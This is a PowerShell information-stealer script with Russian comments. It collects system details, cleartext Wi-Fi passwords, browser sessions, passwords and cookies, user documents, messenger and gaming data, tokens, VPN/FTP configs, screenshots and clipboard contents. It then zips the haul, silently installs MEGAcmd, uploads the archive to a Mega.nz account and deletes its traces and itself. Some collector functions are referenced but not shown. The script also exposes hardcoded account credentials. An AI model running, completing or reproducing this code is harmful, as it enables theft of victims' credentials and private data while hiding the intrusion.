# --- Настройки Mega.nz ---
$MegaEmail = "zyxeram@gmail.com"
$MegaPassword = "Ajrcstmono2@"
$MaxPartSize = 100MB  # Размер части для Mega.nz

# --- Настройки сбора данных ---
$StealBrowserData      = $true
$StealFiles            = $true
$StealSystemInfo       = $true
$StealGamingSessions   = $true
$StealMessengerLogs    = $true
$StealSessionsAndTokens= $true
$TakeScreenshot        = $true
$GrabClipboard         = $true
$StealVpnFtp           = $true

# --- Настройки очистки ---
$SelfDelete = $true

$OutputMessages = @{
    Start        = "Запуск профессионального модуля сбора данных..."
    SystemInfo   = "[+] Сбор информации о системе и сети..."
    BrowserSearch= "[+] Поиск установленных браузеров..."
    BrowserData  = "[+] Извлечение файлов сессий, паролей и cookies для оффлайн-анализа..."
    Files        = "[+] Поиск и копирование файлов (doc, txt, xls)..."
    Gaming       = "[+] Поиск данных игровых клиентов (Steam, Epic Games)..."
    Messengers   = "[+] Сбор логов мессенджеров (Telegram, Discord)..."
    Tokens       = "[+] Поиск токенов авторизации..."
    Screenshot   = "[+] Создание скриншота экрана..."
    Clipboard    = "[+] Копирование данных из буфера обмена..."
    VpnFtp       = "[+] Поиск конфигураций VPN, FTP (FileZilla, WinSCP)..."
    Archiving    = "[+] Архивирование данных..."
    Sending      = "[+] Отправка архива в Mega.nz..."
    Cleaning     = "[+] Очистка следов..."
    Complete     = "Процесс завершен."
}

# --- Скрытая установка MEGAcmd ---
function Ensure-MEGAcmd {
    $exeName = "mega-cmd.exe"
    $exePath1 = "$env:LOCALAPPDATA\MEGAcmd\$exeName"
    $exePath2 = "$env:ProgramFiles\MEGAcmd\$exeName"
    $setupURL = "https://mega.io/MEGAcmdSetup.exe"
    $setupPath = "$env:TEMP\MEGAcmdSetup.exe"

    if (!(Test-Path $exePath1) -and !(Test-Path $exePath2)) {
        Write-Host "Скачиваем и устанавливаем MEGAcmd..."
        Invoke-WebRequest -Uri $setupURL -OutFile $setupPath
        Start-Process -FilePath $setupPath -ArgumentList "/S" -WindowStyle Hidden -Wait
        Remove-Item $setupPath -Force -ErrorAction SilentlyContinue
    }
    # Добавляем путь в PATH в рамках текущей сессии
    $env:PATH += ";$env:LOCALAPPDATA\MEGAcmd;$env:ProgramFiles\MEGAcmd"
}

# --- Отправка файла в Mega.nz через MegaCMD ---
function Send-MegaFile {
    param($FilePath, $RemotePath)
    Ensure-MEGAcmd

    try {
        # Логин в Mega (если ещё не залогинены)
        $loginCheck = & mega-whoami 2>&1
        if ($loginCheck -match "Not logged") {
            & mega-login $MegaEmail $MegaPassword | Out-Null
        }

        # Загружаем файл
        & mega-put "$FilePath" "$RemotePath"
        Write-Host "Файл успешно загружен: $RemotePath" -ForegroundColor Green
    }
    catch {
        Write-Warning "Failed to send file to Mega.nz: $($_.Exception.Message)"
    }
}

# --- Разделение файла на части ---
function Split-File {
    param (
        [string]$FilePath,
        [int64]$MaxBytes = $MaxPartSize
    )
    $buffsize = 8MB
    $files = @()
    $fs = [System.IO.File]::OpenRead($FilePath)
    $part = 1

    try {
        while ($fs.Position -lt $fs.Length) {
            $target = "$($FilePath)_part$part.zip"
            $partStream = [System.IO.File]::Create($target)
            $written = 0
            while (($written -lt $MaxBytes) -and ($fs.Position -lt $fs.Length)) {
                $toRead = [Math]::Min([Math]::Min($buffsize, ($MaxBytes - $written)), ($fs.Length - $fs.Position))
                $buffer = New-Object byte[] $toRead
                $read = $fs.Read($buffer, 0, $toRead)
                if ($read -gt 0) { $partStream.Write($buffer, 0, $read); $written += $read }
                else { break }
            }
            $partStream.Close()
            $files += $target
            $part++
        }
    }
    finally { $fs.Close() }
    return $files
}

function Start-Stealer {
    $LogFolder = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')"
    if (-not (Test-Path $LogFolder)) {
        New-Item -Path $LogFolder -ItemType Directory -Force | Out-Null
    }

    Write-Host $OutputMessages.Start -ForegroundColor Yellow

    try {
        if ($StealSystemInfo) {
            Write-Host $OutputMessages.SystemInfo -ForegroundColor Cyan
            Get-SystemInformation -LogPath $LogFolder
        }
        if ($TakeScreenshot) {
            Write-Host $OutputMessages.Screenshot -ForegroundColor Cyan
            Get-Screenshot -LogPath $LogFolder
        }
        if ($GrabClipboard) {
            Write-Host $OutputMessages.Clipboard -ForegroundColor Cyan
            Get-ClipboardData -LogPath $LogFolder
        }
        if ($StealBrowserData) {
            Write-Host $OutputMessages.BrowserSearch -ForegroundColor Cyan
            $BrowserProfiles = Find-AllBrowserProfiles
            if ($null -ne $BrowserProfiles) {
                Write-Host $OutputMessages.BrowserData -ForegroundColor Cyan
                Get-BrowserFiles -BrowserProfiles $BrowserProfiles -LogPath "$LogFolder\BrowserData"
            }
        }
        if ($StealFiles) {
            Write-Host $OutputMessages.Files -ForegroundColor Cyan
            Copy-UserFiles -LogPath "$LogFolder\Files"
        }
        if ($StealGamingSessions) {
            Write-Host $OutputMessages.Gaming -ForegroundColor Cyan
            Get-GamingData -LogPath "$LogFolder\Gaming"
        }
        if ($StealMessengerLogs) {
            Write-Host $OutputMessages.Messengers -ForegroundColor Cyan
            Get-MessengerData -LogPath "$LogFolder\Messengers"
        }
        if ($StealSessionsAndTokens) {
            Write-Host $OutputMessages.Tokens -ForegroundColor Cyan
            Get-Tokens -LogPath "$LogFolder\Tokens" -BrowserProfiles $BrowserProfiles
        }
        if ($StealVpnFtp) {
            Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan
            Get-VpnFtpData -LogPath "$LogFolder\VpnFtp"
        }

        $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
        Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
        
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($LogFolder, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)

        Write-Host $OutputMessages.Sending -ForegroundColor Yellow
        $size = (Get-Item $ZipPath).Length

        if ($size -ge $MaxPartSize) {
            $parts = Split-File -FilePath $ZipPath -MaxBytes $MaxPartSize
            $i = 1
            foreach ($partFile in $parts) {
                Send-MegaFile -FilePath $partFile -RemotePath "/Logs/Log_part_$i`_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
                Remove-Item $partFile -Force -ErrorAction SilentlyContinue
                $i++
            }
        } else {
            Send-MegaFile -FilePath $ZipPath -RemotePath "/Logs/Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
        }
    }
    catch {
        Write-Host "Произошла ошибка: $($_.Exception.Message)" -ForegroundColor Red
    }
    finally {
        Write-Host $OutputMessages.Cleaning -ForegroundColor Yellow
        Remove-Item -Path $LogFolder -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $ZipPath -Force -ErrorAction SilentlyContinue
        if ($SelfDelete) {
            $scriptPath = $MyInvocation.MyCommand.Path
            if ($scriptPath -and (Test-Path $scriptPath)) {
                Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
            }
        }
        Write-Host $OutputMessages.Complete -ForegroundColor Green
    }
}

# --- Функции сбора данных (оставляю секцию для расширения, пример ниже) ---

function Get-SystemInformation {
    param($LogPath)
    $SysInfoPath = "$LogPath\SystemInfo.txt"
    try {
        $info = Get-ComputerInfo | Select-Object *
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
        $geo = Invoke-RestMethod -Uri "http://ip-api.com/json/$ip" -TimeoutSec 5

        "Date: $(Get-Date)"              | Out-File $SysInfoPath -Append -Encoding utf8
        "Username: $env:USERNAME"        | Out-File $SysInfoPath -Append -Encoding utf8
        "Computer Name: $env:COMPUTERNAME" | Out-File $SysInfoPath -Append -Encoding utf8
        "IP Address: $ip"                | Out-File $SysInfoPath -Append -Encoding utf8
        "Location: $($geo.city), $($geo.country)" | Out-File $SysInfoPath -Append -Encoding utf8
        "OS: $($info.OsName)"            | Out-File $SysInfoPath -Append -Encoding utf8
        "CPU: $($info.CsProcessors.Name[0])" | Out-File $SysInfoPath -Append -Encoding utf8
        "RAM: $([math]::Round($info.OsTotalVisibleMemorySize / 1MB)) MB" | Out-File $SysInfoPath -Append -Encoding utf8

        "--- Network ---"                | Out-File $SysInfoPath -Append -Encoding utf8
        (netsh wlan show profiles) | ForEach-Object {
            if ($_ -match 'All User Profile\s+:\s(.*)') {
                $ssid = $matches[1].Trim()
                $key = (netsh wlan show profile name="$ssid" key=clear | Where-Object { $_ -match 'Key Content' }) -replace '.*:\s', ''
                "Wi-Fi: $ssid | Password: $key" | Out-File $SysInfoPath -Append -Encoding utf8
            }
        }

        "--- Installed Programs ---"     | Out-File $SysInfoPath -Append -Encoding utf8
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Format-Table | Out-File $SysInfoPath -Append -Encoding utf8
    } catch {
        "Failed to get full system info: $($_.Exception.Message)" | Out-File $SysInfoPath -Append -Encoding utf8
    }
}

# --- Остальное: Get-Screenshot, Get-ClipboardData, Find-AllBrowserProfiles, Get-BrowserFiles,
# --- Copy-UserFiles, Get-GamingData, Get-MessengerData, Get-Tokens, Get-VpnFtpData
# (оставьте как в вашем файле, либо интегрируйте нужные вам решения)

# --- Запуск основной функции ---
Start-Stealer
